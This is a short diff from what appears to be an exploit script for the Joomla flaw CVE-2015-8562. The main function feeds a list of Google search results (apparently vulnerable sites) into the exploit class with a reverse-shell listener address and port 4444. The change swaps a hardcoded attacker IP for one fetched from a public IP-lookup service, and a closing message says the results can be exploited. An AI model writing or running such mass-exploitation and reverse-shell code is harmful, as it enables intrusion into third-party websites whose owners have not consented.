@@ -120,7 +120,7 @@ class Joomla_CVE_2015_8562():
 
 def main():
     filename = '../google_results.txt'
-    revshell = '189.61.111.244'
+    req = requests.get('https://api.ipify.org/'); revshell = str(req.content,'utf-8')
     port = 4444
     Joomla_CVE_2015_8562(filename, revshell, port)
     print('[+] \033[31mThe results of this parser can be exploited '
